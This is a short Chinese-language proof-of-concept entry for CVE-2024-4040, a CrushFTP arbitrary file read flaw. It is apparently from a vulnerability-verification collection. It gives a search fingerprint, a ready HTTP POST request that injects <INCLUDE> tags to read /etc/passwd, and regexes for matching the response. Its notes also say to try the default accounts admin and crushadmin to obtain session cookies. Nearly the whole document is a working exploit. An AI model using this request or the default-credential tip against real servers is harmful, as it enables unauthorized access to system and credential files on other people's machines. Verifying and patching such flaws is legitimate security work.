﻿# CrushFTP 任意文件读取漏洞

> 更新时间：2024-04-29

> 漏洞编号：CVE-2024-4040

> 漏洞说明：

> 漏洞特征：title="CrushFTP"

> 验证脚本：HTTP

```
POST /WebInterface/function/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: currentAuth=; CrushAuth=

command=exists&paths=<INCLUDE>/etc/passwd</INCLUDE>&random=0.5382052606828951&c2f=xxxx
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：CrushFTP 任意文件读取漏洞.poc

```
备注说明：
1.可使用admin、crushadmin账号尝试登录系统，获取Cookie值
2、替换Cookie、需要读取的文件路径、c2f的值，发送请求,其中c2f参数的值为Cookie中currentAuth值
```
